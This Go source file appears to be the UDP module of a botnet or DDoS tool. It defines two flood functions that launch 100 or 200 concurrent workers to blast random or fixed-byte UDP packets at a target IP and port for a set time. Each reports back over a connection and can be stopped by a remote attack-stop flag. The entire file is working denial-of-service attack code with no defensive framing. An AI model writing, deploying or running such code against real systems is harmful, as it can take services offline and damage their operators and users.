package udp

import (
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	"go_net/pkg/core"
)

func StartFlood(targetIP string, targetPort, sourcePort int, durationSecs, packetSize int, conn net.Conn) {
	targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
	if err != nil {
		core.SendResponse(conn, fmt.Sprintf("shit doesnt work: %v", err))
		return
	}

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)
	
	var wg sync.WaitGroup
	numWorkers := 100

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			var udpConn *net.UDPConn
			var err error

			if sourcePort > 0 {
				srcAddr := &net.UDPAddr{Port: sourcePort}
				udpConn, err = net.ListenUDP("udp", srcAddr)
			} else {
				udpConn, err = net.ListenUDP("udp", nil)
			}

			if err != nil {
				return
			}
			defer udpConn.Close()

			r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			numPreGen := 1024
			preGenPayloads := make([][]byte, numPreGen)
			for p := 0; p < numPreGen; p++ {
				buf := make([]byte, packetSize)
				pattern := p % 3
				if pattern == 0 {
					r.Read(buf)
				} else if pattern == 1 {
					// All 0s
				} else {
					for k := range buf {
						buf[k] = 0xFF
					}
				}
				preGenPayloads[p] = buf
			}

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				for j := 0; j < 50; j++ {
					udpConn.WriteTo(preGenPayloads[j%numPreGen], targetAddr)
				}
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: UDP Flood on %s completed.", targetAddr.String()))
}

func StartPlainFlood(targetIP string, targetPort, sourcePort int, durationSecs, packetSize int, conn net.Conn) {
	targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
	if err != nil {
		core.SendResponse(conn, fmt.Sprintf("ERROR: Could not resolve target address: %v", err))
		return
	}

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	var wg sync.WaitGroup
	numWorkers := 200

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			var udpConn *net.UDPConn
			var err error

			if sourcePort > 0 {
				srcAddr := &net.UDPAddr{Port: sourcePort}
				udpConn, err = net.ListenUDP("udp", srcAddr)
			} else {
				udpConn, err = net.ListenUDP("udp", nil)
			}

			if err != nil {
				return
			}
			defer udpConn.Close()

			buf := make([]byte, packetSize)
			rand.Read(buf)

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				for j := 0; j < 100; j++ {
					udpConn.WriteTo(buf, targetAddr)
				}
			}
		}(i)
	}

	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: UDPPlain Flood on %s completed.", targetAddr.String()))
}
